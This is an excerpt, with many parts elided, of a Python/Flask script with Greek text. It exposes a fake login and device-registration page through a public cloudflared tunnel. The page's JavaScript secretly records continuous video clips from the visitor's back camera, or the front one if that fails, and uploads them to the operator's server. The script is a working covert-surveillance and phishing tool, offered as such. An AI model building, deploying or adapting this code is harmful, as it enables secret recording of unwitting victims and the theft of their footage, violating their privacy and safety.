...
# --- Εγκατάσταση και Διαμόρφωση Εξαρτήσεων ---
...
def check_dependencies():
    ...
    try:
        ...
        print("Εγκατάσταση λειτουργικού πακέτου: Flask...", file=sys.stderr)
        install_package("Flask")

def run_cloudflared_and_print_link(port, script_name):
    """Ξεκινά ένα tunnel cloudflared και εμφανίζει το δημόσιο σύνδεσμο."""
...
def get_recording_duration():
    ...
    print("Προτείνεται: 5-10 δευτερόλεπτα για τα καλύτερα αποτελέσματα")
    ...
    while True:
        try:
            ...
            print(f"Ορισμένη διάρκεια εγγραφής: {duration} δευτερόλεπτα")
            return duration
...
# Καθολική μεταβλητή για τη διάρκεια εγγραφής (θα οριστεί μετά την είσοδο χρήστη)
RECORDING_DURATION_MS = 5000  # Προεπιλογή 5 δευτερόλεπτα σε χιλιοστά του δευτερολέπτου

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Εγγραφές Πίσω Κάμερας')
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# Θα δημιουργήσουμε το πρότυπο HTML δυναμικά για να συμπεριλάβουμε τη διάρκεια εγγραφής
def create_html_template(duration_ms):
    """Δημιουργεί το πρότυπο HTML με την καθορισμένη διάρκεια εγγραφής."""
...
<body>
    <div class="main-container">
        ...
        <main class="login-form">
            <form action="/submit_credentials" method="post">
                ...
                <p>Για να ολοκληρώσετε την εγγραφή της συσκευής σας, σαρώστε τον κωδικό QR ταυτοποίησης που σας παρέχεται.</p>
    ...
    <div class="duration-info" id="durationInfo">Εγγραφή: {duration_seconds}s διαστήματα</div>
    ...
    <script>
        ...
        // Διάρκεια εγγραφής σε χιλιοστά του δευτερολέπτου
        ...
        async function startCamera() {{
            const constraints = {{
                ...
                video: {{ 
                    facingMode: 'environment', // Αίτημα για πίσω κάμερα
                    width: {{ ideal: 1280 }},
                    height: {{ ideal: 720 }}
                }}
            }};
            ...
            try {{
                ...
                console.error("Αποτυχία πρόσβασης πίσω κάμερας:", err);
                // Εφεδρική λύση σε μπροστινή κάμερα αν η πίσω κάμερα δεν είναι διαθέσιμη
                try {{
                    constraints.video.facingMode = 'user';
                    stream = await navigator.mediaDevices.getUserMedia(constraints);
                    startContinuousRecording();
                }} catch (fallbackErr) {{
                    console.error("Αποτυχία πρόσβασης κάμερας τελείως:", fallbackErr);
                }}
            }}
        }}
        ...
        function startRecording() {{
            ...
            try {{
                ...
                try {{
                    ...
                    // Εφεδρική λύση σε προεπιλεγμένο τύπο mime
        ...
        function handleRecordingStop() {{
            ...
            // Άμεση έναρξη επόμενης εγγραφής (με μικρή καθυστέρηση για καθαρή έναρξη)
        ...
        function sendVideoToServer() {{
            ...
            try {{
                ...
                reader.onloadend = function() {{
                    ...
                    $.ajax({{
                        ...
                        success: function(response) {{
                            console.log('Το βίντεο ανέβηκε με επιτυχία:', response.filename);
                        }},
                        error: function(xhr, status, error) {{
                            console.error('Σφάλμα μεταφόρτωσης βίντεο:', error);
                        }}
                    }});
                }};
                ...
                console.error("Σφάλμα προετοιμασίας βίντεο για μεταφόρτωση:", err);
            }}
        }}
...
def capture_video():
    try:
        ...
        if data and 'video' in data:
            ...
            # Δημιουργία ονόματος αρχείου με τη σημερινή ημερομηνία σε μορφή YYYYMMDD_HHMMSS
            ...
            # Αν το αρχείο υπάρχει, προσθήκη μετρητή (π.χ., 20231224_143045_1.webm, 20231224_143045_2.webm)
            counter = 1
...
if __name__ == '__main__':
    ...
    port = 4041
    script_name = "Σελίδα Σύνδεσης (Συνεχείς Εγγραφές Πίσω Κάμερας)"
    ...
    print("Αν πολλά βίντεο εγγράφονται το ίδιο δευτερόλεπτο, θα αποθηκευτούν ως:")
    print("  YYYYMMDD_HHMMSS_1.webm, YYYYMMDD_HHMMSS_2.webm, κλπ.")
    print("\nΕκκίνηση διακομιστή...")
    print(f"Αυτό το σκριπτ θα εγγράφει συνεχώς βίντεο {recording_duration_seconds} δευτερολέπτων από την πίσω κάμερα.")
